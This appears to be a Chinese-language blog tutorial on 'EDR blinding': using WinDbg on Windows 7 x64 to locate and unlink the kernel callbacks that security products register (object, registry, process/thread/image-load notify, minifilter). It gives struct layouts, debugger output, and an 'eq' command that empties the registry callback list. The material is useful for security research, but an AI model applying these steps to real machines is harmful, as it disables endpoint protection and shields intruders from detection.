# EDR致盲 - 清除6大内核回调

## LIST_ENTRY 结构(注意,此结构出现频率极高!!!!!!!!!!!!)
```
Windows 内核的 LIST_ENTRY 结构定义如下：

typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY* Flink;  // 指向下一个节点
    struct _LIST_ENTRY* Blink;  // 指向上一个节点
} LIST_ENTRY, *PLIST_ENTRY;

内核中使用双向链表,内存布局大概如下
typedef struct test
{
    ...
    _LIST_ENTRY list;
    int a;
    int b;
    char c[10];
    ...
}
```

## ObRegisterCallbacks(下面调试机器为windows7 x64系统，屏蔽EDR 对其3环进程的保护)
```
#初始加载pdb
!sym noisy
.reload /f nt

x nt!PsProcessType
dt nt!_OBJECT_TYPE


```

### 1)定位PsProcessType 和PsThreadType全局内核变量地址
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250310153913832_9247.png?raw=true)

### 2)获取PsProcessType的具体值(上一步获取的是指针),定位CallbackList链表(此链表中保存的就是我们要清除的回调函数地址)
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250310155104983_32105.png?raw=true)

### 3)查看CallbackList链表中的数据,定位具体要删除的回调函数地址(图中有点错误，选中的不是链表首尾，是下一节点和上一节点)
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250310164313536_27035.png?raw=true)


## CmRegisterCallback(清除注册表通知回调)

### 1)定位CallbackListHead双向链表地址
```
uf nt!CmUnRegisterCallback
x nt!CallbackListHead
```
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250311104641992_1532.png?raw=true)

### 2)遍历CallbackListHead
```
!list -x "dt nt!_LIST_ENTRY" nt!CallbackListHead

typedef struct _CMREG_CALLBACK {
    LIST_ENTRY List;
    ULONG Unknown1;
    ULONG Unknown2;
    LARGE_INTEGER Cookie;
    PVOID Unknown3;
    PEX_CALLBACK_FUNCTION Function;
} CMREG_CALLBACK, *PCMREG_CALLBACK;
```
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250311111240442_28837.png?raw=true)
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250311111428490_29548.png?raw=true)

### 3)致盲
```
dq nt!CallbackListHead
eq fffff800`040db9f0 fffff800`040db9f0

致盲原理 => 断链
    1.方法一 判断双向链表中每项,哪个是杀软,在摘除当前项
    2.方法二 摘除所有项,简单粗暴,当前是此方法
```
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250311113229771_21636.png?raw=true)

## PsSetCreateProcessNotifyRoutine  PsSetCreateThreadNotifyRoutine PsSetLoadImageNotifyRoutine
```
进程通知回调、线程通知回调、Image 加载通知回调 摘除
下面以 PsSetCreateProcessNotifyRoutine 举例,其它都是一样的结构
```

### 1)定位 PspCreateProcessNotifyRoutine 数组
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250311165644788_12695.png?raw=true)

### 2）遍历数据,判断是否致盲
```
下图中未公开的结构体为EX_CALLBACK_ROUTINE_BLOCK ，它是没有记录。但是ReactOS给了它定义：

typedef struct _EX_CALLBACK_ROUTINE_BLOCK {
    EX_RUNDOWN_REF RundownProtect;
    PEX_CALLBACK_FUNCTION Function;
    PVOID Context;
} EX_CALLBACK_ROUTINE_BLOCK, *PEX_CALLBACK_ROUTINE_BLOCK;

该结构体前8位是EX_RUNDOWN_REF 结构，可以忽略，后面的PEX_CALLBACK_FUNCTION 就是回调函数的地址
```
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250311170101693_14098.png?raw=true)
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250311171335095_5407.png?raw=true)

## MiniFilter(清除微过滤器的回调)
```
FLT_FILTER   表示当前有哪些minifilter驱动
FLT_INSTANCE 表示这个minifilter附加了哪个设备/卷

!fltkd.filter  fffffa8018fb7920
!fltkd.instace fffffa8018ec0010

kd> !fltkd.filters  查看总的minifilter驱动信息

Filter List: fffffa8019a206e0 "Frame 0" 
   FLT_FILTER: fffffa8018fb7920 "sysdiag" "324600"
      FLT_INSTANCE: fffffa8018ec0010 "sysdiag" "324600"
      FLT_INSTANCE: fffffa8018ebc010 "sysdiag" "324600"
      FLT_INSTANCE: fffffa8019048b20 "sysdiag" "324600"
      FLT_INSTANCE: fffffa802375bb20 "sysdiag" "324600"
   FLT_FILTER: fffffa801c7ad010 "luafv" "135000"
      FLT_INSTANCE: fffffa8019933010 "luafv" "135000"
   FLT_FILTER: fffffa8019a1c2c0 "FileInfo" "45000"
      FLT_INSTANCE: fffffa8019bf83a0 "FileInfo" "45000"
      FLT_INSTANCE: fffffa8019cda6b0 "FileInfo" "45000"
      FLT_INSTANCE: fffffa801a073bb0 "FileInfo" "45000"
      FLT_INSTANCE: fffffa801aed0bb0 "FileInfo" "45000"


kd> x fltmgr!FltGlobals
fffff880`01101200 fltmgr!FltGlobals = <no type information>
kd> dt fltmgr!_Globals fffff880`01101200
   +0x000 DebugFlags       : 0
   +0x008 TraceFlags       : 0
   +0x010 GFlags           : 0x43
   +0x018 RegHandle        : 0x27
   +0x020 NumProcessors    : 1
   +0x024 CacheLineSize    : 0x40
   +0x028 AlignedInstanceTrackingListSize : 0x40
   +0x030 ControlDeviceObject : 0xfffffa80`1993c790 _DEVICE_OBJECT
   +0x038 DriverObject     : 0xfffffa80`18d78250 _DRIVER_OBJECT
   +0x040 KtmTransactionManagerHandle : (null) 
   +0x048 TxVolKtmResourceManagerHandle : (null) 
   +0x050 TxVolKtmResourceManager : (null) 
   +0x058 FrameList        : _FLT_RESOURCE_LIST_HEAD
   +0x0d8 Phase2InitLock   : _FAST_MUTEX
   +0x110 RegistryPath     : _UNICODE_STRING "\Registry\Machine\System\CurrentControlSet\Services\FltMgr"
   +0x120 RegistryPathBuffer : [160]  "\Registry\Machine\System\CurrentControlSet\Services\FltMgr"
   +0x260 GlobalVolumeOperationLock : 0xfffffa80`1a0b2360 _EX_PUSH_LOCK_CACHE_AWARE
   +0x268 FltpServerPortObjectType : 0xfffffa80`1a0b4470 _OBJECT_TYPE
   +0x270 FltpCommunicationPortObjectType : 0xfffffa80`19971a40 _OBJECT_TYPE
   +0x278 MsgDeviceObject  : 0xfffffa80`199b6350 _DEVICE_OBJECT
   +0x280 ManualDeviceAttachTimer : _KTIMER
   +0x2c0 ManualDeviceAttachTimerDpc : _KDPC
   +0x300 ManualDeviceAttachWork : _WORK_QUEUE_ITEM
   +0x320 ManualDeviceAttachLimit : 0n62
   +0x324 ManualDeviceAttachDelay : 0n0
   +0x340 TargetedIoCtrlLookasideList : _NPAGED_LOOKASIDE_LIST
   +0x3c0 StreamListCtrlLookasideList : _NPAGED_LOOKASIDE_LIST
   +0x440 FileListCtrlLookasideList : _NPAGED_LOOKASIDE_LIST
   +0x4c0 NameCacheCreateCtrlLookasideList : _NPAGED_LOOKASIDE_LIST
   +0x540 AsyncIoContextLookasideList : _NPAGED_LOOKASIDE_LIST
   +0x5c0 WorkItemLookasideList : _NPAGED_LOOKASIDE_LIST
   +0x640 NameControlLookasideList : _NPAGED_LOOKASIDE_LIST
   +0x6c0 OperationStatusCtrlLookasideList : _NPAGED_LOOKASIDE_LIST
   +0x740 NameGenerationContextLookasideList : _NPAGED_LOOKASIDE_LIST
   +0x7c0 FileLockLookasideList : _PAGED_LOOKASIDE_LIST
   +0x840 TxnParameterBlockLookasideList : _NPAGED_LOOKASIDE_LIST
   +0x8c0 TxCtxExtensionNPagedLookasideList : _NPAGED_LOOKASIDE_LIST
   +0x940 TxVolCtxLookasideList : _NPAGED_LOOKASIDE_LIST
   +0x9c0 TxVolStreamListCtrlEntryLookasideList : _PAGED_LOOKASIDE_LIST
   +0xa40 FltpParameterOffsetTable : [28] <unnamed-tag>
   +0xb20 ThrottledWorkCtrl : _THROTTLED_WORK_ITEM_CTRL
   +0xbb8 Stats            : _FLT_STATS
   +0xc2c LostItemDelayInSeconds : 0x1e
   +0xc30 VerifiedFiltersList : _LIST_ENTRY [ 0xfffff880`01101e30 - 0xfffff880`01101e30 ]
   +0xc40 VerifiedFiltersLock : 0
   +0xc48 VerifiedResourceLinkFailures : 0n0
   +0xc4c VerifiedResourceUnlinkFailures : 0n0

```

### 定位 Filter List 的值
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250313105952402_28079.png?raw=true)
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250313160901450_17430.png?raw=true)
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250313162629480_11713.png?raw=true)

### 定位 FLTP_FRAME 的值
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250313164334926_2766.png?raw=true)
### 定位 FLT_FILTER 的值

#### 定位 FLTP_FRAME 结构体中 RegisteredFilters 中的 FLT_FILTER
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250313172121227_17260.png?raw=true)

#### 定位 FLT_INSTANCE 数据 (这里是edr致盲点)
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250313175506233_4215.png?raw=true)
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250313180407386_21016.png?raw=true)

### 定位 FLT_VOLUME 的值

#### 定位 FLTP_FRAME 结构体中 RegisteredFilters 中的 FLT_VOLUME
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250314101701150_31448.png?raw=true)

#### 定位 CALLBACK_NODE (致盲点)
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250314104027634_9650.png?raw=true)
![](https://github.com/easycodetime/easycodetime.github.io/blob/main/blog_images/20250314105821546_25222.png?raw=true)